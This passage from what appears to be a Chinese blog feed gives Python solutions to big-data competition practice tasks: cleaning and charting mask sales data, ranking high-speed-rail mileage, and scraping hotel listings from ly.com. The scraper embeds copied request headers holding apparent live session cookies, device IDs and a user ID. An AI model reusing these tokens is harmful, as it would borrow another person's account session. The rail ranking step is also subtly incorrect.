punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'各月各省总订单量趋势图'</span><span class="token punctuation">)</span><span class="token comment"># 获取各月各省总订单量</span>month_order2 <span class="token operator">=</span> mask_data_clean<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'月份'</span><span class="token punctuation">,</span> <span class="token string">'省'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'订单量'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>month_order2_df <span class="token operator">=</span> month_order2<span class="token punctuation">.</span>unstack<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 根据month_order2_df绘制多条折线图，标题为'各省各月总订单量趋势图'</span>month_order2_df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind <span class="token operator">=</span> <span class="token string">'line'</span><span class="token punctuation">,</span>figsize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'各省各月总订单量趋势图'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>month_order1<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据竞赛模拟赛题2</title>
      <link href="/2023/08/23/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%8B%9F%E8%B5%9B%E9%A2%982/"/>
      <url>/2023/08/23/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%8B%9F%E8%B5%9B%E9%A2%982/</url>
      
        <content type="html"><![CDATA[<h1 id="口罩厂亏损案例"><a href="#口罩厂亏损案例" class="headerlink" title="口罩厂亏损案例"></a>口罩厂亏损案例</h1><h2 id="数据清洗"><a href="#数据清洗" class="headerlink" title="数据清洗"></a>数据清洗</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pdmask_data <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'./工作/mask_data.csv'</span><span class="token punctuation">,</span> encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>mask_data<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 删除所有缺失值</span>mask_data <span class="token operator">=</span> mask_data<span class="token punctuation">.</span>dropna<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>mask_data<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 删除指定列</span>mask_data <span class="token operator">=</span> mask_data<span class="token punctuation">.</span>dropna<span class="token punctuation">(</span>subset<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'订单量'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>mask_data<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 查找 mask_data 中的重复行</span><span class="token keyword">print</span><span class="token punctuation">(</span>mask_data<span class="token punctuation">.</span>duplicated<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>mask_data<span class="token punctuation">[</span>mask_data<span class="token punctuation">.</span>duplicated<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 删除重复值</span>mask_data <span class="token operator">=</span> mask_data<span class="token punctuation">.</span>drop_duplicates<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>mask_data<span class="token punctuation">[</span>mask_data<span class="token punctuation">.</span>duplicated<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 筛选单价小于等于 200 的数据</span>mask_data <span class="token operator">=</span> mask_data<span class="token punctuation">[</span>mask_data<span class="token punctuation">[</span><span class="token string">'单价'</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">200</span><span class="token punctuation">]</span><span class="token comment"># 查看 mask_data 的描述性统计信息</span><span class="token keyword">print</span><span class="token punctuation">(</span>mask_data<span class="token punctuation">.</span>describe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 转换日期数据，并设置对应的日期格式</span>date_data <span class="token operator">=</span> pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span>mask_data<span class="token punctuation">[</span><span class="token string">'日期'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">format</span> <span class="token operator">=</span> <span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>date_data<span class="token punctuation">)</span><span class="token comment"># 提取日期数据中的月份信息</span><span class="token comment"># Series.dt.year、Series.dt.month、 Series.dt.day</span>month_data <span class="token operator">=</span> date_data<span class="token punctuation">.</span>dt<span class="token punctuation">.</span>month<span class="token keyword">print</span><span class="token punctuation">(</span>month_data<span class="token punctuation">)</span><span class="token comment"># 将月份数据添加到原数据中</span>mask_data<span class="token punctuation">[</span><span class="token string">'月份'</span><span class="token punctuation">]</span> <span class="token operator">=</span> month_data<span class="token keyword">print</span><span class="token punctuation">(</span>mask_data<span class="token punctuation">)</span><span class="token comment"># 存取</span>mask_data<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'mask_data_clean.csv'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>mask_data_clean <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'mask_data_clean.csv'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>mask_data_clean<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数据分析与图标展示"><a href="#数据分析与图标展示" class="headerlink" title="数据分析与图标展示"></a>数据分析与图标展示</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取各月总销售额</span>sales_income <span class="token operator">=</span> mask_data_clean<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'月份'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'销售额'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 画出各月总销售额的折线图</span>sales_income<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind <span class="token operator">=</span> <span class="token string">'line'</span><span class="token punctuation">,</span> figsize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'各月总销售额趋势图'</span><span class="token punctuation">)</span><span class="token comment"># 获取各月总订单量</span>order_number <span class="token operator">=</span> mask_data_clean<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'月份'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'订单量'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 画出各月总订单量的折线图</span>order_number<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind <span class="token operator">=</span> <span class="token string">'line'</span><span class="token punctuation">,</span> figsize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'各月总订单量趋势图'</span><span class="token punctuation">)</span><span class="token comment"># 获取每月平均单价</span>month_price <span class="token operator">=</span> mask_data_clean<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'月份'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'单价'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 画出各月平均单价的折线图</span>month_price<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind <span class="token operator">=</span> <span class="token string">'line'</span><span class="token punctuation">,</span> figsize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'各月平均单价趋势图'</span><span class="token punctuation">)</span><span class="token comment"># 获取各月各省总订单量</span>month_order1 <span class="token operator">=</span> mask_data_clean<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'省'</span><span class="token punctuation">,</span> <span class="token string">'月份'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'订单量'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>month_order1_df <span class="token operator">=</span> month_order1<span class="token punctuation">.</span>unstack<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 根据month_order1_df绘制多条折线图，标题为'各月各省总订单量趋势图'</span>month_order1_df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind <span class="token operator">=</span> <span class="token string">'line'</span><span class="token punctuation">,</span> figsize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'各月各省总订单量趋势图'</span><span class="token punctuation">)</span><span class="token comment"># 获取各月各省总订单量</span>month_order2 <span class="token operator">=</span> mask_data_clean<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'月份'</span><span class="token punctuation">,</span> <span class="token string">'省'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'订单量'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>month_order2_df <span class="token operator">=</span> month_order2<span class="token punctuation">.</span>unstack<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 根据month_order2_df绘制多条折线图，标题为'各省各月总订单量趋势图'</span>month_order2_df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind <span class="token operator">=</span> <span class="token string">'line'</span><span class="token punctuation">,</span>figsize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'各省各月总订单量趋势图'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>month_order1<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据竞赛模拟赛题1</title>
      <link href="/2023/08/22/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%8B%9F%E8%B5%9B%E9%A2%981/"/>
      <url>/2023/08/22/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%8B%9F%E8%B5%9B%E9%A2%981/</url>
      
        <content type="html"><![CDATA[<h1 id="高铁里程"><a href="#高铁里程" class="headerlink" title="高铁里程"></a>高铁里程</h1><p>(1)   数据采集</p><p>(2)   导入pandas创建DataFrame对象df,显示所有数据列，要求格式保持列对齐。</p><p>(3)   将空白全部填0处理。</p><p>(4)   增加排名列，排名依据为营业里程数</p><p>(5)   将新数据导出为DataTest2.xlsx。</p><p>(6)   以DataTest2.xlsx中国家和地区为横纵数据，以营业里程 在建里程  合计里程 为纵轴数据绘制折线图，要求有标题内容是全球高铁里程;有图例；有网格线。</p><p>(7)   将第6题图表类型改为柱形图。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># (1)数据采集</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> pandas <span class="token keyword">import</span> DataFrame<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token comment">#设置列名对齐</span>pd<span class="token punctuation">.</span>set_option<span class="token punctuation">(</span><span class="token string">'display.unicode.east_asian_width'</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://10.163.72.39/BigData_Data_get.php?currentPage=1&amp;page_size=50&amp;table=%E9%AB%98%E9%93%81%E9%87%8C%E7%A8%8B'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token comment"># print(res.text)</span>res_json <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> res_json<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>data_df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>data_df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'高铁.csv'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment"># print(data_df)</span><span class="token comment"># (2)导入pandas创建DataFrame对象df,显示所有数据列，要求格式保持列对齐。</span><span class="token comment">#设置列名对齐</span>pd<span class="token punctuation">.</span>set_option<span class="token punctuation">(</span><span class="token string">'display.unicode.east_asian_width'</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'高铁.csv'</span><span class="token punctuation">,</span>index_col<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># (3)将空白全部填0处理。</span>df1 <span class="token operator">=</span>  df<span class="token punctuation">.</span>fillna<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">)</span><span class="token comment"># (4)增加排名列，排名依据为营业里程数</span>df2 <span class="token operator">=</span> df1<span class="token punctuation">[</span><span class="token string">'营业里程/万千米'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df2<span class="token punctuation">.</span>index<span class="token punctuation">)</span>df1<span class="token punctuation">[</span><span class="token string">'排名'</span><span class="token punctuation">]</span> <span class="token operator">=</span> df2<span class="token punctuation">.</span>index<span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">)</span><span class="token comment"># (5)将新数据导出为DataTest2.xlsx。</span>df1<span class="token punctuation">.</span>to_excel<span class="token punctuation">(</span><span class="token string">'DataTest2.xlsx'</span><span class="token punctuation">)</span>df3 <span class="token operator">=</span> df1<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'营业里程/万千米'</span><span class="token punctuation">,</span><span class="token string">'在建里程/万千米'</span><span class="token punctuation">,</span><span class="token string">'合计里程/万千米'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>df3<span class="token punctuation">)</span><span class="token comment"># (6)以DataTest2.xlsx中国家和地区为横纵数据，</span><span class="token comment"># 以营业里程 在建里程  合计里程 为纵轴数据绘制折线图，</span><span class="token comment"># 要求有标题内容是全球高铁里程;有图例；有网格线。</span><span class="token comment"># 指定字体为SimHei</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>df3<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'line'</span><span class="token punctuation">,</span>title<span class="token operator">=</span><span class="token string">'全球高铁里程'</span><span class="token punctuation">,</span>grid<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># (7)将第6题图表类型改为柱形图。</span>df3<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'bar'</span><span class="token punctuation">,</span>title<span class="token operator">=</span><span class="token string">'全球高铁里程'</span><span class="token punctuation">,</span>grid<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="赛题1"><a href="#赛题1" class="headerlink" title="赛题1"></a>赛题1</h1><h2 id="任务A：数据采集与处理"><a href="#任务A：数据采集与处理" class="headerlink" title="任务A：数据采集与处理"></a>任务A：数据采集与处理</h2><h3 id="子任务一：数据采集"><a href="#子任务一：数据采集" class="headerlink" title="子任务一：数据采集"></a>子任务一：数据采集</h3><p>爬取酒店列表数据，例如酒店名称、地址、商圈、评分、评论数、类型，并且存入到hotel.csv文件中</p><p><a href="https://www.ly.com/hotel/hotellist?pageSize=20&amp;t=1693794571107&amp;city=321&amp;inDate=2023-09-04&amp;outDate=2023-09-05&amp;filterList=8888_1">https://www.ly.com/hotel/hotellist?pageSize=20&amp;t=1693794571107&amp;city=321&amp;inDate=2023-09-04&amp;outDate=2023-09-05&amp;filterList=8888_1</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> pandas <span class="token keyword">import</span> Series<span class="token punctuation">,</span>DataFrame<span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token triple-quoted-string string">'''GET /tapi/v2/list?pageSize=20&amp;t=1693794571107&amp;city=321&amp;inDate=2023-09-24&amp;outDate=2023-09-25&amp;filterList=8888_1&amp;pageIndex=1&amp;sugActInfo=&amp;traceToken=%7C*%7CcityId:201%7C*%7CqId:ba76a09f-5078-460c-9b7d-57217c13821b%7C*%7Cst:city%7C*%7CsId:201%7C*%7Cscene_ids:0%7C*%7Csmz:A%7C*%7Cbkt:r8%7C*%7C HTTP/1.1Accept-Encoding: gzip, deflate, brConnection: keep-aliveCookie: H5CookieId=659dd903-48ae-4b67-8fb2-33d8705beed5; businessLine=hotel; firsttime=1695293420836; hotel_lang=zh-cn; qdid=-9999; 17uCNRefId=RefId=0&amp;SEFrom=&amp;SEKeyWords=; TicketSEInfo=RefId=0&amp;SEFrom=&amp;SEKeyWords=; CNSEInfo=RefId=0&amp;tcbdkeyid=&amp;SEFrom=&amp;SEKeyWords=&amp;RefUrl=; route=2380a3751663c45f75a020910759de98; H5Channel=mnoreferseo%2CSEO; Hm_lvt_c6a93e2a75a5b1ef9fb5d4553a2226e5=1695293420,1695517390; Hm_lpvt_c6a93e2a75a5b1ef9fb5d4553a2226e5=1695517390; lasttime=1695517391132; JSESSIONID=BC2BC32ED75C1C4DD80AEDA392CAE8C5; indate=2023-09-24; outdate=2023-09-25Host: www.ly.comReferer: https://www.ly.com/hotel/hotellist?pageSize=20&amp;t=1695517474275&amp;city=321&amp;inDate=2023-09-24&amp;outDate=2023-09-25&amp;filterList=8888_1Sec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.289 Safari/537.36accept: application/json, text/plain, */*accept-language: zh-cnappfrom: 16cluster: idcdeviceid: 659dd903-48ae-4b67-8fb2-33d8705beed5sec-ch-ua: "Chromium";v="15", "Not.A/Brand";v="8"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"timezone: 8tmapi-client: tpctraceid: 9c2b492e-e312-4cb1-97e9-04d6264539dc'''</span>headers_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>line_list <span class="token operator">=</span> headers<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> line_list<span class="token punctuation">:</span>    key <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    value <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    headers_dict<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token comment"># print(headers_dict)</span>url <span class="token operator">=</span> <span class="token string">'https://www.ly.com/tapi/v2/list?pageSize=20&amp;t=1695293420663&amp;city=321&amp;inDate=2023-09-21&amp;outDate=2023-09-22&amp;filterList=8888_1&amp;pageIndex=1&amp;sugActInfo=&amp;traceToken=%7C*%7CcityId:201%7C*%7CqId:29b85124-bba0-4f2f-b072-156f0e81b228%7C*%7Cst:city%7C*%7CsId:201%7C*%7Cscene_ids:0%7C*%7Csmz:A%7C*%7Cbkt:r8%7C*%7C'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers_dict<span class="token punctuation">)</span>res_json <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>res_json<span class="token punctuation">)</span><span class="token punctuation">)</span>hotel_list <span class="token operator">=</span> res_json<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'hotelList'</span><span class="token punctuation">]</span>hotel_list_df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data<span class="token operator">=</span>hotel_list<span class="token punctuation">)</span><span class="token comment"># df = df[['A', 'B']]</span>hotel_list_df <span class="token operator">=</span> hotel_list_df<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'hotelName'</span><span class="token punctuation">,</span><span class="token string">'hotelAddress'</span><span class="token punctuation">,</span><span class="token string">'recallReason'</span><span class="token punctuation">,</span>                               <span class="token string">'commentScore'</span><span class="token punctuation">,</span><span class="token string">'commentCount'</span><span class="token punctuation">,</span><span class="token string">'starLevelDes'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token comment"># print(hotel_list_df)</span>hotel_list_df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'hotel.csv'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>hotel_list_df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'hotel.csv'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hotel_list_df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> pandas <span class="token keyword">import</span> Series<span class="token punctuation">,</span>DataFrameheaders_str <span class="token operator">=</span> <span class="token triple-quoted-string string">'''accept: application/json, text/plain, */*Accept-Encoding: gzip, deflate, braccept-language: zh-cnappfrom: 16cluster: idcConnection: keep-aliveCookie: soso_17u_tab_open_index=1; H5CookieId=2a31035b-81b0-452f-8af5-4bc2cb6d6229; firsttime=1693790207090; abtkey=037eed29-b152-4fc3-92a8-027faa2dffc6; _tcudid_v2=GVAglBHWXx1wFDh4_P4gvwe79p_DO7Vf2Yj7sQ9vCd4; nus=userid=682242716&amp;nickName=%e5%90%8c%e7%a8%8b%e4%bc%9a%e5%91%98_0D043E7512A&amp;level=1; __tctma=144323752.1693790169808694.1693790169437.1693790169437.1693793067529.2; hotel_lang=zh-cn; 17uCNRefId=RefId=0&amp;SEFrom=&amp;SEKeyWords=; TicketSEInfo=RefId=0&amp;SEFrom=&amp;SEKeyWords=; CNSEInfo=RefId=0&amp;tcbdkeyid=&amp;SEFrom=&amp;SEKeyWords=&amp;RefUrl=; qdid=-9999; businessLine=hotel; H5Channel=mnoreferseo%2CSEO; indate=2023-09-09; outdate=2023-09-10; route=e83eaebd8f07fc1b8cfab528aeb2900e; lasttime=1694239332948; JSESSIONID=A23D8BD953AE131A1233B6F406759B2Edeviceid: 2a31035b-81b0-452f-8af5-4bc2cb6d6229Host: www.ly.comReferer: https://www.ly.com/hotel/hotellist?pageSize=20&amp;t=1694239332807&amp;city=321&amp;inDate=2023-09-09&amp;outDate=2023-09-10&amp;filterList=8888_1sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"Sec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-origintimezone: 8tmapi-client: tpctraceid: d6d36af2-7f3a-4504-a125-db1cfa470c97User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'''</span>headers_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>line_list <span class="token operator">=</span> headers_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> line_list<span class="token punctuation">:</span>    key <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    value <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    headers_dict<span class="token punctuation">[</span>key<span 